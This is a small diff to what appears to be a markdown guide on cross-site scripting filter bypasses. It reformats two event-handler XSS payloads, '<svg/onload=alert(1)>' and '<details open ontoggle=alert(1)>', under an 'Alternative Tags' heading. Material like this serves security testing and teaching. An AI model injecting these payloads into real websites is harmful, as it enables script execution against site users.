@@ -30,8 +30,8 @@ JS executes before .jpg is parsed.
 
 3. Alternative Tags
 
-`<svg/onload=alert(1)>
-<details open ontoggle=alert(1)>`
+`<svg/onload=alert(1)>`
+`<details open ontoggle=alert(1)>`
 
 Browsers allow JS in weird tags.
 
